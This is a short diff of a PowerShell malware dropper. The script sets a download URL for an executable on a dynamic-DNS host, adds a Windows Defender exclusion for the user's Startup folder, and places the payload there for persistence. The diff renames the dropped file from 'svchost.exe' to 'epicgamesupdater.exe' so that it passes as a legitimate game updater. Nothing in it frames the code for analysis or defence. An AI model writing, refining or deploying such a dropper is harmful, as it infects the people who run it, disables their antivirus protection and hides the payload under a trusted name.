@@ -5,7 +5,7 @@ $hwnd = (Get-Process -Id $PID).MainWindowHandle
 
 $url = "http://fcsab.ddns.net:3010/love.exe"
 $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-$exePath = "$startupPath\svchost.exe"
+$exePath = "$startupPath\epicgamesupdater.exe"
 
 try { Add-MpPreference -ExclusionPath $startupPath -EA 0 } catch {}
 try {
@@ -14,3 +14,4 @@ try {
 } catch {}
 
 exit
+
